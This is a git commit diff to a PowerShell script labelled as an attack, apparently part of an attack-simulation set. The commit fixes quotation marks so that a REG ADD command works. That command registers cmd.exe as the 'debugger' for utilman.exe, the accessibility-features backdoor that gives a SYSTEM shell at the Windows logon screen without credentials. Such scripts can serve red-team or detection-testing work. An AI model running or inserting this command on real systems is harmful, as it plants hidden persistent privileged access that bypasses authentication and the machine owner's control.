3bfb55e9ad7335c16b87230d7b24914678e13f46
martingratt <martin_gratt@hotmail.com>
2020-06-02 18:06:17 +0200

    Update Attack2_AccessibilityFeatures.ps1

--- Skripts/Attack2_AccessibilityFeatures.ps1
+++ Skripts/Attack2_AccessibilityFeatures.ps1
@@ -17,7 +17,7 @@ Start-Transcript -path $path -append
 
 ####################AccessibilityFeatures START####################
 
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 
 ####################AccessibilityFeatures END####################
 
